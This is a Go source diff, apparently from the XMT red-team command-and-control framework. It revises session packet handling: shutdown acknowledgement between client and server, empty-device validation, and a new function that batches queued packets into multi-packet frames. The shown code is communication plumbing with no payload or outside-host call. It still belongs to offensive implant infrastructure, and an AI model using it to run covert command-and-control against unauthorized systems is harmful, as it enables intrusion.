@@ -9,13 +9,15 @@ import (
 	"sync"
 	"time"
 
-	"github.com/iDigitalFlame/logx/logx"
+	"github.com/PurpleSec/logx"
 	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/com/limits"
 	"github.com/iDigitalFlame/xmt/data"
 	"github.com/iDigitalFlame/xmt/device"
 	"github.com/iDigitalFlame/xmt/util"
 )
 
+// Packet Message Constats
 const (
 	MsgPing       = 0xFE00
 	MsgSleep      = 0xFE01
@@ -201,7 +203,7 @@ func notifyClient(l *Listener, s *Session, p *com.Packet) {
 	if s != nil {
 		switch p.ID {
 		case MsgProfile:
-			if j, err := p.Uint8(); err == nil && j >= 0 && j <= 100 {
+			if j, err := p.Uint8(); err == nil && j <= 100 {
 				s.jitter = j
 			}
 			if t, err := p.Uint64(); err == nil && t > 0 {
@@ -212,26 +214,15 @@ func notifyClient(l *Listener, s *Session, p *com.Packet) {
 				return
 			}
 		case MsgShutdown:
-			switch {
-			case p.Job == 1 && s.parent == nil:
-				s.log.Debug("[%s] Server acknowledged shutdown, closing Session.", s.ID)
-				s.shutdown(shutdownClose)
-				return
-			case s.parent == nil:
-				s.log.Debug("[%s] Server indicated shutdown, acknowledging and closing Session.", s.ID)
-				s.shutdown(shutdownAck)
-				return
-			case p.Job == 1 && s.parent != nil:
-				s.log.Debug("[%s] Client acknowledged shutdown, closing Session.", s.ID)
-				s.shutdown(shutdownClose)
-			default:
+			if s.parent != nil {
 				s.log.Debug("[%s] Client indicated shutdown, acknowledging and closing Session.", s.ID)
-				s.shutdown(shutdownAck)
+				s.WritePacket(&com.Packet{ID: MsgShutdown, Job: 1})
+			} else {
+				if s.done > flagOpen {
+					return
+				}
+				s.log.Debug("[%s] Server indicated shutdown, closing Session.", s.ID)
 			}
-			if s.Shutdown != nil {
-				s.s.events <- event{s: s, sFunc: s.Shutdown}
-			}
-			s.parent.close <- s.Device.ID.Hash()
 			s.Close()
 			return
 		case MsgRegister:
@@ -306,6 +297,9 @@ func readPacket(c io.Reader, w Wrapper, t Transform) (*com.Packet, error) {
 	if err := r.Close(); err != nil {
 		return nil, fmt.Errorf("unable to close cache reader: %w", err)
 	}
+	if len(p.Device) == 0 {
+		return nil, fmt.Errorf("unable to read from stream: %w", io.ErrNoProgress)
+	}
 	return p, nil
 }
 func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
@@ -347,4 +341,57 @@ func writePacket(c io.Writer, w Wrapper, t Transform, p *com.Packet) error {
 		return fmt.Errorf("unable to write to stream writer: %w", err)
 	}
 	return nil
+}
+func nextPacket(c chan *com.Packet, p *com.Packet, i device.ID) (*com.Packet, *com.Packet, error) {
+	var (
+		n    = &com.Packet{ID: MsgMultiple, Device: i, Flags: com.FlagMulti}
+		t    int
+		x    *com.Packet
+		m, a bool
+	)
+	if p != nil {
+		m, t = true, 1
+		if p.Flags&com.FlagChannel != 0 {
+			n.Flags |= com.FlagChannel
+		}
+		if err := p.MarshalStream(n); err != nil {
+			n.Clear()
+			return nil, nil, err
+		}
+		p.Clear()
+		p = nil
+	}
+	for len(c) > 0 && t < limits.SmallLimit() && n.Size() < limits.FragLimit() {
+		p = <-c
+		if p.Size()+n.Size() > limits.FragLimit() {
+			x = p
+			break
+		}
+		if p.Verify(i) {
+			a = true
+		} else {
+			m = true
+		}
+		if p.Flags&com.FlagChannel != 0 {
+			n.Flags |= com.FlagChannel
+		}
+		if err := p.MarshalStream(n); err != nil {
+			return nil, x, err
+		}
+		t++
+		p.Clear()
+		p = nil
+	}
+	if !a {
+		m, t = true, t+1
+		if err := (&com.Packet{ID: MsgPing, Device: i}).MarshalStream(n); err != nil {
+			return nil, x, err
+		}
+	}
+	n.Close()
+	if m {
+		n.Flags |= com.FlagMultiDevice
+	}
+	n.Flags.SetLen(uint16(t))
+	return n, x, nil
 }
